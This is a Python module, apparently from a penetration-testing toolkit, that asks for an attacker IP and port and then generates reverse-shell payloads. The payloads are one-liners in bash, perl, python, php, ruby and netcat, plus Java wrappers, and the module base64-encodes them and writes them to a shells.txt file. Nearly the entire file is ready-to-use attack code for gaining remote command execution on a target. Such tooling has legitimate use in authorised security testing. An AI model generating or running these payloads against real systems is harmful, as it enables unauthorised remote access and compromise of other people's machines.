# listeners
# nc -l -p 5232 -vvv


import os
import platform
import base64
from Session import *
from MenuBase import *

class Shell:
    def __init__(self, desc, codeLines):
        self._desc = desc
        self._lines = codeLines
        self._base64 = base64.b64encode(bytes(str(codeLines)[1:-1] , 'utf-8'))
        self._encrypted = base64.b64encode(bytes(str(codeLines)[1:-1] , 'utf-8'))

    def __repr__(self):
        return 'Shell'

    def __str__(self):
        return 'Description: ' + str(self._desc) + '\nCode: ' + '\n'.join(map(str, self._lines)) + '\nBase64: ' + \
            str(self._base64) + '\nEncrypted: ' + str(self._encrypted)

class ShellsMenu(MenuBase):

    def __init__(self):
        self._shells = []

    def run(self):
        print('Enter the IP to reverse to: ', end = '')
        host = input()

        print('Enter the port: ', end = '')
        port = input()

        self.generateShells(host, port)
        self.createShellsFile()

        return self.prompt('nc -l -p PORT -vvv')

    def generateShells(self, host, port):

        desc = 'Tested on Ubuntu (5232 is the port), this one is pretty slick'
        code = 'bash -i >& /dev/tcp/' + host +'/' + port + ' 0>&1'
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Tested on Ubuntu (5232 is the port)'
        code = 'exec 5<>/dev/tcp/' + host + '/' + port + ';cat <&5 | while read line; do $line 2>&5 >&5; done'
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Using PERL tested on Ubuntu'
        code = 'perl -e \'use Socket;$i="' + host + '";$p=' + port + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Same PERL script, but for Windows (NOT TESTED)'
        code = 'perl -e \'use Socket;$i="' + host + '";$p=' + port + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("cmd.exe -i");};\''
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Python 1'
        code = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + host + '",' + port + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Python 1 for Windows (NOT TESTED)'
        code = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + host + '",' + port + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["cmd.exe","-i"]);\''
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Simple Python 2'
        code = 'python -c \'import pty;pty.spawn("/bin/bash")\''
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Simple Python 2 for Windows (NOT TESTED)'
        code = 'python -c \'import pty;pty.spawn("cmd.exe")\''
        self._shells.append(Shell(desc, [ code ]))

        desc = 'PHP'
        code = 'php -r \'$sock=fsockopen("' + host + '",' + port + ');exec("/bin/sh -i <&3 >&3 2>&3");\''
        self._shells.append(Shell(desc, [ code ]))

        desc = 'PHP for Windows (NOT TESTED)'
        code = 'php -r \'$sock=fsockopen("' + host + '",' + port + ');exec("cmd.exe -i <&3 >&3 2>&3");\''
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Ruby'
        code = 'ruby -rsocket -e \'f=TCPSocket.open("' + host + '",' + port + ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Ruby for Windows (NOT TESTED)'
        code = 'ruby -rsocket -e \'f=TCPSocket.open("' + host + '",' + port + ').to_i;exec sprintf("cmd.exe -i <&%d >&%d 2>&%d",f,f,f)\''
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Netcat'
        code = 'nc -e /bin/sh ' + host + ' ' + port
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Netcat for Windows'
        code = 'nc -e cmd.exe ' + host + ' ' + port
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Netcat 2'
        code = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + host + ' ' + port + ' >/tmp/f'
        self._shells.append(Shell(desc, [ code ]))

        desc = 'Java (Compiles, but NOT TESTED yet)'
        code1 = 'class helloworld {'
        code2 = '  public static void main(String[] args) {'
        code3 = '    try {'
        code4 = '      String[] cmdArry = new String[3];'
        code5 = '      cmdArry[0] = "/bin/bash";'
        code6 = '      cmdArry[1] = "-c";' 
        code7 = '      cmdArry[2] = "exec 5<>/dev/tcp/' + host + '/' + port +' cat <&5 | while read line; do $line 2>&5 >&5; done";'
        code8 = '      Process p = Runtime.getRuntime().exec(cmdArry);'
        code9 = '      p.waitFor();'
        code10 = '    } catch(Exception ex) {'
        code11 = '      ex.printStackTrace();'
        code12 = '    }'
        code13 = '  }'
        code14 = '}'
        self._shells.append(Shell(desc, [ code1, code2, code3, code4, code5, code6, code7, code8, code9, code10, code11, code12, code13, code14 ]))

        desc = 'Java for Windows (NOT TESTED)'
        code1 = 'class helloworld {'
        code2 = '  public static void main(String[] args) {'
        code3 = '    try {'
        code4 = '      String[] cmdArry = new String[3];'
        code5 = '      cmdArry[0] = "cmd.exe";'
        code6 = '      cmdArry[1] = "-c";' 
        code7 = '      cmdArry[2] = "exec 5<>/dev/tcp/' + host + '/' + port +' cat <&5 | while read line; do $line 2>&5 >&5; done";'
        code8 = '      Process p = Runtime.getRuntime().exec(cmdArry);'
        code9 = '      p.waitFor();'
        code10 = '    } catch(Exception ex) {'
        code11 = '      ex.printStackTrace();'
        code12 = '    }'
        code13 = '  }'
        code14 = '}'
        self._shells.append(Shell(desc, [ code1, code2, code3, code4, code5, code6, code7, code8, code9, code10, code11, code12, code13, code14 ]))
        
        for shell in self._shells:
            print(str(shell))

    def createShellsFile(self):
        try:
            with open(session.getExploitDir() + '/shells.txt','w') as outfile:
                for shell in self._shells:
                    print(str(shell))
                    outfile.write(str(shell))
                    outfile.write('\r\n')

        except Exception as e:
            print(e)
            logging.exception(type(e))

        return